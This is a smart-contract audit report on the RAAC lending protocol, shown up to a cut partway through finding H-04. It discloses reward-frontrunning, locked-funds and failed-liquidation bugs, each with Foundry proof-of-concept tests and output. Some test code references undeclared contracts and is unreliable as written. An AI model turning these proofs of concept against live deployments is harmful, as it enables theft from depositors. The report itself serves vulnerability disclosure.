- ## High Risk Findings
    - ### [H-01. StabilityPool reward distribution is frontrunnable](#H-01)
    - ### [H-02. RAACNFT mint function receives funds to address(this) but has no way of withdrawing them](#H-02)
    - ### [H-03. Any attempt to liquidate a user will fail, because StabilityPool does not hold crvUSD during operational lifecycle](#H-03)
    - ### [H-04. LendingPool allows users to borrow more crvUSD than their NFT is worth](#H-04)
    - ### [H-05. Mismatch of crvUSD approved versus transferred between StabilityPool and LendingPool prevents users from being liquidated](#H-05)
    - ### [H-06. After Liquidating a user NFTs are transferred into the StabilityPool which though lacks functionality to withdraw them, effectively locking them in the contract](#H-06)
    - ### [H-07. WithdrawNft in LendingPool has an logic error leaving the protocol with bad debt](#H-07)
    - ### [H-08. RAAC Token fees on transfer do not use FeeCollector collectFee, therefore bypassing accounting logic](#H-08)
- ## Medium Risk Findings
    - ### [M-01. getNFTPrice in LendingPool has no checks in place to check for stale prices](#M-01)
    - ### [M-02. RAACReleaseOrchastrator has emergencyRevoke transfer cleared tokens to self locking them in the contract.](#M-02)
    - ### [M-03. Treasury.sol has misleading accounting, leading to uninformed government proposals](#M-03)
    - ### [M-04. balanceOf(address(this)) in StabilityPool causes reward distribution to be higher than it should be](#M-04)
    - ### [M-05. closeLiquidation within LendingPool does not allow partial repayments, which can cause massive losses to users within edge case](#M-05)
    - ### [M-06. getBoostMultiplier in BoostController only returns either MIN_BOOST or MAX_BOOST, no dynamic value in between](#M-06)
    - ### [M-07. RAACPrimeRateOracle integration lacks any checks on data integrity](#M-07)
    - ### [M-08. Repayment of debt after the grace period expires leaves the protocol in inconsistent state, locking the NFT in the LendingPool ](#M-08)
    - ### [M-09. An edge case within the pause can cause users to be unfairly liquidated](#M-09)
    - ### [M-10. RToken does not accrue any interest, contradicting the Docs and Natspec](#M-10)
    - ### [M-11. Protocol Insolvency due to inability to withdraw rewards from curve](#M-11)
- ## Low Risk Findings
    - ### [L-01. lastUpdateTimestamp in RAACHausePrices has no connection to a specific asset but is updated globally](#L-01)



### Number of findings:
- High: 8
- Medium: 11
- Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. StabilityPool reward distribution is frontrunnable            



## Description

The lack of Time-Weighted reward calculation in `StabilityPool.sol` allows malicious users to continuously drain the majority of rewards, resulting in an unfair reward distribution compared to long-time staking users.



## Vulnerable Code & Details

`StabilityPool::calculateRaacRewards`:

```Solidity
function calculateRaacRewards(address user) public view returns (uint256) {
        uint256 userDeposit = userDeposits[user];
        uint256 totalDeposits = deToken.totalSupply();
        uint256 totalRewards = raacToken.balanceOf(address(this));
        if (totalDeposits < 1e6) return 0;
        return (totalRewards * userDeposit) / totalDeposits;
    }
```

As you can clearly see in above calculation, any consideration for the time a user has staked is missing, the only thing on which the calculation is based is the deposit amount at the time of withdraw. Therefor a user can potentially use flashloans or other high liquidity, provide it for the transaction and immediately withdraw it afterwards, harming a fair reward distribution and taking away the incentives for users to stake at all.



## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_PocFrontrunRewardDistro -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol"; 

contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;

    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

    function test_PocFrontrunRewardDistro() public {
        /// Setting up staking users at a known block
        vm.roll(10);
        vm.startPrank(user1);
        crvusd.approve(address(lendingPool), type(uint128).max);
        rToken.approve(address(stabilityPool), type(uint128).max);
        lendingPool.deposit(20e18);
        assertEq(rToken.totalSupply(), 20e18);
        stabilityPool.deposit(20e18);
        vm.stopPrank();
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint128).max);
        rToken.approve(address(stabilityPool), type(uint128).max);
        lendingPool.deposit(20e18);
        stabilityPool.deposit(20e18);
        vm.stopPrank();
        /// Moving the block 1 year ahead so rewards will accumulate
        vm.roll(2628000);
        /// Executing the frontrun of user3
        vm.startPrank(user3);
        crvusd.approve(address(lendingPool), type(uint128).max);
        rToken.approve(address(stabilityPool), type(uint128).max);
        lendingPool.deposit(type(uint128).max);
        stabilityPool.deposit(type(uint128).max);
        stabilityPool.withdraw(type(uint128).max);
        vm.stopPrank();
        vm.prank(user1);
        stabilityPool.withdraw(20e18);
        vm.prank(user2);
        stabilityPool.withdraw(20e18);
        /// logging the users raac balances
        console.log("User 3 Frontrun Balance: ", raacToken.balanceOf(user3));
        console.log("User 1 Balance: ", raacToken.balanceOf(user1));
        console.log("User 2 Balance: ", raacToken.balanceOf(user2));
    }
}
```

Running above code produces the following console log:

```Solidity
Ran 1 test for test/invariant/PoC.t.sol:PoC
[PASS] test_PocFrontrunRewardDistro() (gas: 988216)
Logs:
  User 3 Frontrun Balance:  341548620034722221031593
  User 1 Balance:  20074
  User 2 Balance:  20075
```

As you can clearly see in the log, even User 1 and User 2 were staking 20k rTokens for roughly 1 year (estimated via the 7200 blocks per day proposed within the protocol), but user3 who frontran their withdraws took most of the rewards staking for only 1 transaction, leaving the long-term stakers with crumbs.



## Impact

Staking Rewards within RAACs contract system are supposed to attract liquidity, which is needed to liquidate potential users, since liquidation in the protocol is strictly INTERNAL.
With the rewards being front-runnable within a single transaction Users lose the incentive to stake their tokens, leaving the protocol with insufficient liquidity for liquidations, directly affecting the health of the protocol, therefore, even though reward MEVs are usually considered a medium, I will rate this as a High, because of above mentioned liquidity issues for internal liquidations.

Likelihood: High
Impact: High

Severity: High



## Tools Used

Foundry & Manual Review



## Recommended Mitigation

Consider using a Time-Weighted-Average calculation for rewards distribution.



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry

  

  

# Default target that runs everything in sequence

all: install-foundry init-foundry
```

And run `make all`

## <a id='H-02'></a>H-02. RAACNFT mint function receives funds to address(this) but has no way of withdrawing them            



## Description

The mint price of any given NFT will be paid by the buyer using the `RAACNFT::mint` function, claiming a certain NFT with an ID and a Price. While the contract is pulling the price and keeps it within, it lacks though functionality to either approve or forward those funds. Therefore locking them in the contract.



## Vulnerable Code

`RAACNFT::mint`:

```Solidity
    function mint(uint256 _tokenId, uint256 _amount) public override {
        uint256 price = raac_hp.tokenToHousePrice(_tokenId);
        if(price == 0) { revert RAACNFT__HousePrice(); }
        if(price > _amount) { revert RAACNFT__InsufficientFundsMint(); }
        token.safeTransferFrom(msg.sender, address(this), _amount);
        _safeMint(msg.sender, _tokenId);
        if (_amount > price) {
            uint256 refundAmount = _amount - price;
            token.safeTransfer(msg.sender, refundAmount);
        }
        emit NFTMinted(msg.sender, _tokenId, price);
    }
```

As you can clearly see the token (presumably crvUSD) is getting pulled from the sender into the contract. Now looking at the interface of `IRAACNFT`:

```Solidity
interface IRAACNFT is IERC721, IERC721Enumerable {
    function mint(uint256 _tokenId, uint256 _amount) external;
    function getHousePrice(uint256 _tokenId) external view returns (uint256);
    function addNewBatch(uint256 _batchSize) external;
    function setBaseUri(string memory _uri) external;
    function currentBatchSize() external view returns (uint256);
    // Events
    event NFTMinted(address indexed minter, uint256 tokenId, uint256 price);
    event BaseURIUpdated(string uri);
    // Errors
    error RAACNFT__BatchSize();
    error RAACNFT__HousePrice();
    error RAACNFT__InsufficientFundsMint();
    error RAACNFT__InvalidAddress();
}
```

We can see that this contract does not have a `transfer` or `approve` function and therefore locks those ERC-20 tokens inside the contract.



## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_PocLockedFundsInNftContract -vv`

```Solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";

contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;
    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        attacker = new Attacker(address(raacNFT));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }
  
    function test_PocLockedFundsInNftContract() public {
        /// Simply minting an NFT and checking where the funds are
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(2, 5e18);
        vm.stopPrank();
        crvusd.mint(user1, 7e18);
        vm.startPrank(user1);
        crvusd.approve(address(raacNFT), 7e18);
        raacNFT.mint(2, 7e18);
        vm.stopPrank();
        assertEq(crvusd.balanceOf(user1), 2e18);
        console.log("Locked crvUSD balance: ", crvusd.balanceOf(address(raacNFT)));
    }
}
```

Running the above test results in:

```Solidity
Ran 1 test for test/invariant/PoC.t.sol:PoC
[PASS] test_PocLockedFundsInNftContract() (gas: 273042)
Logs:
  Locked crvUSD balance:  5000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.10ms (1.08ms CPU time)

Ran 1 test suite in 27.33ms (9.10ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Showcasing that the funds, indeed, are remaining in the contract.

## Impact

Since this behavior occurs during normal operation of the contract the likelihood is high.
Since the NFTs to be minted represent real estate in the real world, we are presumably talking about a couple of hundred thousand USD locked within. Therefore I rate the impact as high too.

As conclusion the severity results to high.



## Tools Used

Foundry & Manual Review



## Recommendations

One possibility would be to directly send the funds to another contract/wallet in which those funds would be supposed to be:

```diff
+   address public raacReceiver;

-	function mint(uint256 _tokenId, uint256 _amount) public override {
+   function mint(uint256 _tokenId) public override {
	        uint256 price = raac_hp.tokenToHousePrice(_tokenId);
	        if(price == 0) { revert RAACNFT__HousePrice(); }
-	        if(price > _amount) { revert RAACNFT__InsufficientFundsMint(); }
-	        token.safeTransferFrom(msg.sender, address(this), _amount);
+           token.safeTransferFrom(msg.sender, raacReceiver, price);
	        _safeMint(msg.sender, _tokenId);
-	        if (_amount > price) {0
-	            uint256 refundAmount = _amount - price;
-	            token.safeTransfer(msg.sender, refundAmount);
-	        }
	        emit NFTMinted(msg.sender, _tokenId, price);
	}
```

if this solution should not be possible an alternative would be to implement a simple approve function so approved contract can pull those funds:

```diff
+ function approveERC20(address _target, uint256 _amount) external onlyOwner {
+     token.approve(_target, 0); // Reset allowance in case we deal with USDT or so
+     token.approve(_target, _amount);
+ }
```



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry

  

  

# Default target that runs everything in sequence

all: install-foundry init-foundry
```

And run `make all`

## <a id='H-03'></a>H-03. Any attempt to liquidate a user will fail, because StabilityPool does not hold crvUSD during operational lifecycle            



## Description

In `StabilityPool::liquidateBorrower` the function checks for `crvUSDToken.balanceOf(address(this))` but since the contract during is lifecycle never receives `crvUSD` any attempt to liquidate a borrower will fail with `InsufficientBalance()`.



## Vulnerable Code

`StabilityPool::liquidateBorrower`:

```Solidity
function liquidateBorrower(address userAddress) external onlyManagerOrOwner nonReentrant whenNotPaused {
        _update();
        uint256 userDebt = lendingPool.getUserDebt(userAddress);
        uint256 scaledUserDebt = WadRayMath.rayMul(userDebt, lendingPool.getNormalizedDebt());
        if (userDebt == 0) revert InvalidAmount();
@>      uint256 crvUSDBalance = crvUSDToken.balanceOf(address(this));
@>      if (crvUSDBalance < scaledUserDebt) revert InsufficientBalance();
        bool approveSuccess = crvUSDToken.approve(address(lendingPool), scaledUserDebt);
        if (!approveSuccess) revert ApprovalFailed();
        lendingPool.updateState();
        lendingPool.finalizeLiquidation(userAddress);
        emit BorrowerLiquidated(userAddress, scaledUserDebt);
}
```

Clearly shown in the code above we can see at the highlighted marks, that `StabilityPool::liquidateBorrower` will check the current balance of `crvUSD` within `StabilityPool` and revert with `InsufficientBalance()` if the `crvUSDBalance < scaledUserDebt`. The issue arising is, that during the operational lifecycle of this contract, the `StabilityPool` will never receive any `crvUSD`.
As reference, places where crvUSD enters the contract are:

1. `LendingPool::deposit`: The contract receives crvUSD and deposits it into `address reserveRTokenAddress;`
2. `LendingPool::_repay`: The contract receives crvUSD and deposits it into `address reserveRTokenAddress;`
3. `RAACNFT::mint`: Receives crvUSD and keeps it within the contract

And lastly `LendingPool::rebalanceLiquidity` which simply transfers `crvUSD` to and from the Curve Vault.

Therefore any attempt to liquidate undercollateralized users will fail with `InsufficientBalance()`.



## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

`./test/invariant/foundry/stabilityPool/HandlerStabilityPool.t.sol`

```Solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../../../contracts/core/minters/RAACMinter/RAACMinter.sol";

contract HandlerStabilityPool is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;
    // Test Specifics
    address public owner;
    address oracle;
    address public user1;
    address public user2;
    address public user3;
    address[] public users;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 public warptime = 7210;
    uint256 public counter = 1;
    uint256 public currentBlockNumber = 10;
    /// Shadow Variables
    struct UserBalances {
        uint256 expectedCrvUsdBalance;
        uint256 actualCrvUsdBalance;
        uint256 expectedRTokenBalance;
        uint256 actualRTokenBalance;
        uint256 expectedDETokenBalance;
        uint256 actualDETokenBalance;
        uint256 raacTokenUserExpected;
    }
    address internal user;
    mapping(address user => UserBalances) public userBalances;
    constructor() {
        vm.warp(STARTING_TIME);
        vm.roll(currentBlockNumber);
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        users.push(user1);
        users.push(user2);
        users.push(user3); 
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }
	/// Ranomize actors
    modifier useActor(uint256 userId) {
        user = users[bound(userId, 0, users.length - 1)];
        vm.startPrank(user);
        _;
        vm.stopPrank();
    }
    /// Move Blocks to ensure rewards can and will be accumulated
    modifier passesTime() {
        currentBlockNumber = counter * warptime;
        counter = counter + 1;
        vm.roll(currentBlockNumber);
        _;
    }

////////////////////////////////////////////////////////////////////////////////
////////////////////////// Lending Pool Basics /////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

    function deposit(uint256 userId, uint256 amount) public useActor(userId) {
        amount = bound(amount, 1, type(uint48).max);
        crvusd.approve(address(lendingPool), amount);
        lendingPool.deposit(amount);
    }
    
    function withdraw(uint256 userId, uint256 amount) public useActor(userId) {
        amount = bound(amount, 1, type(uint48).max);
        rToken.approve(address(lendingPool), amount);
        lendingPool.withdraw(amount);
    }
    ////////////////////////////////////////////////////////////////////////////////
//////////////////////////// Stability Pool  ///////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

    function stabilityDeposit(uint256 userId, uint256 amount) public useActor(userId) passesTime {
        if(rToken.balanceOf(user) == 0) {
            return;
        }
        amount = bound(amount, 1, rToken.balanceOf(user));
        rToken.approve(address(stabilityPool), amount);
        stabilityPool.deposit(amount);
    }

    function stabilityWithdrawWithRewards(uint256 userId, uint256 amount) public useActor(userId) passesTime {
        if(userBalances[user].expectedDETokenBalance == 0) {
            return;
        }
        if(userBalances[user].expectedDETokenBalance < amount) {
            vm.expectRevert();
            stabilityPool.withdraw(amount);
        } else {
            amount = bound(amount, 1, userBalances[user].expectedDETokenBalance);
            stabilityPool.withdraw(amount);
        }
    }
}
```

`./test/invariant/foundry/stabilityPool/InvariantStabilityPool.t.sol`

```Solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";
import {HandlerStabilityPool} from "./HandlerStabilityPool.t.sol"; 

contract InvariantStabilityPool is StdInvariant, Test {
    HandlerStabilityPool handler;
    function setUp() public {
        handler = new HandlerStabilityPool();
        bytes4[] memory selectors = new bytes4[](4);
        selectors[0] = handler.stabilityDeposit.selector;
        selectors[1] = handler.stabilityWithdrawWithRewards.selector;
        selectors[2] = handler.deposit.selector;
        selectors[3] = handler.withdraw.selector;
        targetSelector(
            FuzzSelector({addr: address(handler), selectors: selectors})
        );
        targetContract(address(handler));
    }
    function statefulFuzz_stabilityPool() public view {
        uint256 stabilityPoolCrvBalance = handler.crvusd().balanceOf(address(handler.stabilityPool()));
        // The only assertion we need to make the point
        assertEq(stabilityPoolCrvBalance, 0);
    }
}
```

After Copy & Pasting the 2 files into suggested directory we use `forge test --mt statefulFuzz_stabilityPool` to run it, which produces the following log:

```Solidity
[PASS] statefulFuzz_stabilityPool() (runs: 256, calls: 128000, reverts: 0)
╭----------------------+------------------------------+-------+---------+----------╮
| Contract             | Selector                     | Calls | Reverts | Discards |
+==================================================================================+
| HandlerStabilityPool | deposit                      | 32111 | 0       | 0        |
|----------------------+------------------------------+-------+---------+----------|
| HandlerStabilityPool | stabilityDeposit             | 31787 | 0       | 0        |
|----------------------+------------------------------+-------+---------+----------|
| HandlerStabilityPool | stabilityWithdrawWithRewards | 32230 | 0       | 0        |
|----------------------+------------------------------+-------+---------+----------|
| HandlerStabilityPool | withdraw                     | 31872 | 0       | 0        |
╰----------------------+------------------------------+-------+---------+----------╯
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 39.28s (39.27s CPU time)
```

As we can clearly see, over a total of 128,000 total function calls in this example, the Stability Pool does not hold a single crvUSD token.

**Assumptions**:

2 assumptions within have been made to simplify the setup

1. I neglected the NFT Deposit/Borrow/Repay flow for this PoC since the only function which could effect this is `LendingPool::_repay` but the repay function uses the same destination under the hood, so the same behavior is expected.
2. The assumption has been made that it is obvious that, if there is no crvUSD within `StabilityPool` the `liquidateBorrower` function will fail, therefor proving that `StabilityPool` never holds `crvUSD` within its natural operating lifecycle is sufficient.



## Impact

Failures to liquidate users accrues bad debt for the protocol and therefor directly breaks solvency invariants. Therefore the severity is High (Critical) by default.



## Recommended Mitigation

Ensure to store sufficient `crvUSD` in the contract, or allow `StabilityPool` to pull the funds from `reserveRTokenAddress` where it seems the `crvUSD` is supposed to be stored.



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry

  


# Default target that runs everything in sequence

all: install-foundry init-foundry
```

And run `make all`

## <a id='H-04'></a>H-04. LendingPool allows users to borrow more crvUSD than their NFT is worth            



## Description

`LendingPool::borrow` allows users to borrow more crvUSD than they paid for their NFT/their NFT is worth due multiplying the wrong value in the `if-statement`.

## Vulnerable Code & Details

`LendingPool::borrow`:

```Solidity
function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();
        UserData storage user = userData[msg.sender];
        uint256 collateralValue = getUserCollateralValue(msg.sender);
        if (collateralValue == 0) revert NoCollateral();
        ReserveLibrary.updateReserveState(reserve, rateData);
        _ensureLiquidity(amount);
        uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;
@>      if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
            revert NotEnoughCollateralToBorrow();
        }
        uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);
       (bool isFirstMint, uint256 amountMinted, uint256 newTotalSupply) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex);
        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);
        user.scaledDebtBalance += scaledAmount;
        reserve.totalUsage = newTotalSupply;
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, 0, amount);
        _rebalanceLiquidity();
        emit Borrow(msg.sender, amount);
    }
```

As you can see in above code at the highlighted mark, the multiplication `.percentMul(liquidationThreshold)` is applied to the wrong side of the statement, resulting in users being able to borrow more than they should.

## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_PocBorrowmoreThanColleteral -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
